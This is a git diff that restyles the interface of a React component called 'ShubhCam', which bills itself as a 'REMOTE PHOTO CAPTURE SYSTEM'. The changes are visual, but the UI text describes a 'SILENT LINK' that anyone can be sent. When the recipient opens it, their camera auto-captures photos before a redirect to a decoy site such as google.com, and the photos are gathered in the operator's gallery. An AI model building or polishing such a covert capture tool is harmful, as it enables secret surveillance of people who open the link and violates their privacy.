@@ -162,32 +162,43 @@ const ShubhCam = () => {
   };
 
   return (
-    <div className="border-2 border-neon-green rounded-lg p-6 bg-card/30 backdrop-blur mt-6">
+    <div className="relative border-2 border-neon-pink rounded-xl p-5 bg-gradient-to-br from-card/50 via-neon-pink/5 to-card/50 backdrop-blur-sm mt-6 overflow-hidden shadow-[0_0_30px_hsl(var(--neon-pink)/0.2)]">
+      {/* Animated corner accents */}
+      <div className="absolute top-0 left-0 w-16 h-16 border-t-2 border-l-2 border-neon-pink rounded-tl-xl" />
+      <div className="absolute top-0 right-0 w-16 h-16 border-t-2 border-r-2 border-neon-cyan rounded-tr-xl" />
+      <div className="absolute bottom-0 left-0 w-16 h-16 border-b-2 border-l-2 border-neon-cyan rounded-bl-xl" />
+      <div className="absolute bottom-0 right-0 w-16 h-16 border-b-2 border-r-2 border-neon-pink rounded-br-xl" />
+      
+      {/* Glowing orbs */}
+      <div className="absolute -top-10 -right-10 w-32 h-32 bg-neon-pink/20 rounded-full blur-3xl" />
+      <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-neon-cyan/20 rounded-full blur-3xl" />
+
       {/* Header */}
-      <div className="flex items-center gap-3 mb-4">
-        <div className="p-2 rounded-lg border border-neon-cyan bg-neon-cyan/10">
-          <Camera className="w-6 h-6 text-neon-cyan" />
+      <div className="relative flex items-center gap-4 mb-5">
+        <div className="relative p-3 rounded-xl border-2 border-neon-pink bg-gradient-to-br from-neon-pink/20 to-neon-cyan/10 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)]">
+          <Camera className="w-7 h-7 text-neon-pink drop-shadow-[0_0_8px_hsl(var(--neon-pink))]" />
+          <div className="absolute inset-0 rounded-xl border border-neon-pink/50 animate-ping opacity-30" />
         </div>
         <div>
-          <h2 className="font-display font-bold text-xl">
-            <span className="text-neon-green">SHUBH</span>
-            <span className="text-neon-pink">CAM</span>
+          <h2 className="font-display font-bold text-2xl tracking-wider">
+            <span className="text-neon-cyan drop-shadow-[0_0_10px_hsl(var(--neon-cyan))]">SHUBH</span>
+            <span className="text-neon-pink drop-shadow-[0_0_10px_hsl(var(--neon-pink))]">CAM</span>
           </h2>
-          <p className="text-muted-foreground text-xs flex items-center gap-1">
-            <Zap className="w-3 h-3" /> REMOTE PHOTO CAPTURE
+          <p className="text-neon-pink/80 text-xs flex items-center gap-1.5 font-mono">
+            <Zap className="w-3 h-3 animate-pulse" /> REMOTE PHOTO CAPTURE SYSTEM
           </p>
         </div>
       </div>
 
       {/* Tabs */}
-      <div className="flex rounded-lg overflow-hidden border border-neon-green/50 mb-6">
+      <div className="relative flex rounded-xl overflow-hidden border-2 border-neon-pink/50 mb-5 bg-card/50 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
         <button
           onClick={() => setActiveTab("link")}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
+            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide",
             activeTab === "link"
-              ? "bg-neon-green text-background font-bold"
-              : "bg-card text-muted-foreground hover:bg-muted"
+              ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
           )}
         >
           <Zap className="w-4 h-4" /> LINK
@@ -195,10 +206,10 @@ const ShubhCam = () => {
         <button
           onClick={() => setActiveTab("custom")}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
+            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide border-x border-neon-pink/30",
             activeTab === "custom"
-              ? "bg-neon-cyan text-background font-bold"
-              : "bg-card text-muted-foreground hover:bg-muted"
+              ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
           )}
         >
           <Code className="w-4 h-4" /> CUSTOM
@@ -206,10 +217,10 @@ const ShubhCam = () => {
         <button
           onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
           className={cn(
-            "flex-1 py-3 px-2 flex items-center justify-center gap-1 transition-all text-xs",
+            "flex-1 py-3 px-3 flex items-center justify-center gap-2 transition-all text-xs font-bold tracking-wide",
             activeTab === "photos"
-              ? "bg-neon-pink text-background font-bold"
-              : "bg-card text-muted-foreground hover:bg-muted"
+              ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
+              : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
           )}
         >
           <Image className="w-4 h-4" /> ({photos.length})
@@ -217,62 +228,73 @@ const ShubhCam = () => {
       </div>
 
       {activeTab === "link" ? (
-        <div className="space-y-6">
+        <div className="relative space-y-5">
           {/* How it works */}
-          <div className="bg-muted/50 rounded-lg p-4 border border-border">
-            <h3 className="font-bold text-foreground mb-2">How it works:</h3>
-            <ol className="text-sm text-muted-foreground space-y-1 list-decimal list-inside">
-              <li>Copy the link below</li>
-              <li>Share with anyone</li>
-              <li>When they click, camera auto-captures & redirects!</li>
+          <div className="bg-gradient-to-r from-neon-pink/10 to-neon-cyan/10 rounded-xl p-4 border border-neon-pink/30 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
+            <h3 className="font-bold text-neon-pink mb-3 flex items-center gap-2">
+              <Zap className="w-4 h-4" /> How it works:
+            </h3>
+            <ol className="text-sm text-foreground/80 space-y-2">
+              <li className="flex items-center gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-pink/20 text-neon-pink text-xs flex items-center justify-center font-bold">1</span>
+                Copy the link below
+              </li>
+              <li className="flex items-center gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-cyan/20 text-neon-cyan text-xs flex items-center justify-center font-bold">2</span>
+                Share with anyone
+              </li>
+              <li className="flex items-center gap-2">
+                <span className="w-5 h-5 rounded-full bg-neon-purple/20 text-neon-purple text-xs flex items-center justify-center font-bold">3</span>
+                Camera auto-captures & redirects!
+              </li>
             </ol>
           </div>
 
           {/* Session ID */}
-          <div className="flex items-center gap-2 text-xs">
+          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-cyan/30">
             <span className="text-muted-foreground">Session:</span>
-            <span className="text-neon-cyan font-mono">{sessionId}</span>
+            <span className="text-neon-cyan font-mono font-bold tracking-wider">{sessionId}</span>
           </div>
 
           {/* Silent Link */}
-          <div>
-            <div className="flex items-center gap-2 mb-2">
-              <span className="text-neon-cyan">👁</span>
-              <h3 className="text-neon-green font-bold">SILENT LINK (Auto Capture)</h3>
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">👁</span>
+              <h3 className="text-neon-pink font-bold tracking-wide">SILENT LINK (Auto Capture)</h3>
             </div>
             <div className="flex gap-2">
               <Input
                 value={captureLink}
                 readOnly
-                className="bg-input border-neon-green/50 text-neon-green text-xs font-mono"
+                className="bg-background/50 border-neon-pink/50 text-neon-pink text-xs font-mono focus:border-neon-pink focus:ring-neon-pink/30"
               />
               <Button
                 variant="outline"
                 size="icon"
                 onClick={() => copyToClipboard(captureLink)}
-                className="border-neon-green text-neon-green hover:bg-neon-green/10 shrink-0"
+                className="border-neon-pink text-neon-pink hover:bg-neon-pink/20 hover:shadow-[0_0_15px_hsl(var(--neon-pink)/0.4)] shrink-0 transition-all"
               >
                 <Copy className="w-4 h-4" />
               </Button>
             </div>
-            <p className="text-neon-orange text-xs mt-2">
-              ⚠ Capture ke baad redirect: {redirectUrl}
+            <p className="text-neon-orange text-xs mt-3 flex items-center gap-1">
+              ⚠ Capture ke baad redirect: <span className="font-mono">{redirectUrl}</span>
             </p>
           </div>
 
           {/* Redirect URL */}
-          <div>
-            <div className="flex items-center gap-2 mb-2">
-              <span className="text-neon-cyan">🔗</span>
-              <h3 className="text-neon-cyan font-bold">REDIRECT URL</h3>
+          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="text-xl">🔗</span>
+              <h3 className="text-neon-cyan font-bold tracking-wide">REDIRECT URL</h3>
             </div>
             <Input
               value={redirectUrl}
               onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
               placeholder="https://google.com"
-              className="bg-input border-neon-green/50 text-neon-green"
+              className="bg-background/50 border-neon-cyan/50 text-neon-cyan focus:border-neon-cyan focus:ring-neon-cyan/30"
             />
-            <p className="text-neon-purple text-xs mt-2">
+            <p className="text-neon-purple text-xs mt-3">
               💡 User capture ke baad is URL pe redirect hoga
             </p>
           </div>
@@ -281,25 +303,25 @@ const ShubhCam = () => {
           <Button
             onClick={() => window.open(captureLink, '_blank')}
             variant="outline"
-            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
+            className="w-full border-2 border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_20px_hsl(var(--neon-cyan)/0.4)] transition-all py-5"
           >
             <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
           </Button>
 
           {/* Action Buttons */}
-          <div className="space-y-3">
+          <div className="grid grid-cols-2 gap-3">
             <Button
               onClick={generateNewSession}
               variant="outline"
-              className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
+              className="border-2 border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] transition-all py-5"
             >
               <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
             </Button>
             <Button
               onClick={refreshPhotos}
-              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
+              className="bg-gradient-to-r from-neon-pink to-neon-purple text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)] transition-all py-5"
             >
-              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
+              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
             </Button>
           </div>
         </div>
